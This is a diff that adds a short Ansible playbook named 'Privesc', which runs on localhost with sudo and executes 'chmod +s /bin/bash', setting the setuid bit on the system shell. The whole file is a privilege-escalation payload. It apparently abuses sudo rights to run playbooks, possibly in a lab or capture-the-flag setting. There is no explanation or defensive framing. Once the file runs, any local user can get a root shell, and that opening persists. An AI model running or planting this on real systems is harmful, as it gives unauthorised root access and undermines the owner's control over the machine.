@@ -1,0 +1,13 @@
+---
+  - name: Privesc
+    hosts: localhost
+    become: true
+    become_user: root
+    become_method: sudo
+    tasks:
+
+    - name: Shell command
+      shell:
+         "chmod +s /bin/bash"
+      register: cmd
+      tags: cmd
